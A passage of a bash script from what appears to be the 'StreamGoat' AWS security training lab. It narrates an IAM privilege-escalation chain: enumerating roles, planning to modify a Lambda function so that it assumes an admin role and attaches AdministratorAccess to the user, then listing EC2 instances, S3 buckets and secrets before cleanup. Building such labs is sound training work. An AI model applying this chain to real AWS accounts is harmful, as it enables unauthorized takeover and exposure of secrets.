...
# End of Step 2
#############################################
# Step 3. Enumerating custome roles
#############################################
printf "%s%s%s\n" "${BOLD}${CYAN}" "===  Step 3. Enumerating StreamGoat-Role* roles  ===" "${RESET}"
printf "We notice that one of successful enumeration result was for ${YELLOW}IAM List Roles${RESET}. Let's dig inside.\n"
...
printf "\n"
read -r -p "The custom role ${YELLOW}StreamGoat-Role-admin${RESET} looks interesting and lets take its ARN for potential usage in future. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
...
# End of Step 4
#############################################
# Step 5. Reviewing all info collected above
#############################################
printf "%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. Reviewing all info collected above  ===" "${RESET}"
printf "\n"
printf "We saw on step 2 our user has ${YELLOW}lambda:*${RESET} permission, but specifically deny for ${YELLOW}lambda:CreateFunction${RESET}.\n"
printf "On step 4 we identiify lambda function ${MAGENTA}StreamGoat-Lambda_2${RESET} which has assigned policy with ${YELLOW}sts:AssumeRole${RESET}.\n"
printf "And finaly we saw ${CYAN}StreamGoat-Role-admin${RESET} role with FullAdmin privilegies.\n"
printf "Based on this info we plan attack vector will be via modification of ${MAGENTA}StreamGoat-Lambda_2${RESET}:\n 1. AssumeRole ${CYAN}StreamGoat-Role-admin${RESET}\n 2. Assign Role ${CYAN}StreamGoat-Role-admin${RESET} to owned user ${YELLOW}StreamGoat-user${RESET}\n\n"
...
if [ "$admin_attached" == "AdministratorAccess" ]; then
  ...
  printf "Lets perform a few permission enumeration attempts we did on step 2\n"
  sleep 10
  try "EC2 DescribeInstances" aws ec2 describe-instances --max-items 5 --profile "$PROFILE"
  try "S3 ListAllMyBuckets"   aws s3api list-buckets --profile "$PROFILE"
  try "Secrets ListSecrets"   aws secretsmanager list-secrets --max-results 5 --profile "$PROFILE"
...
printf "%s%s%s\n" "${BOLD}${CYAN}" "===  Step 7. Cleanup: Detaching AdministratorAccess from user  ===" "${RESET}"
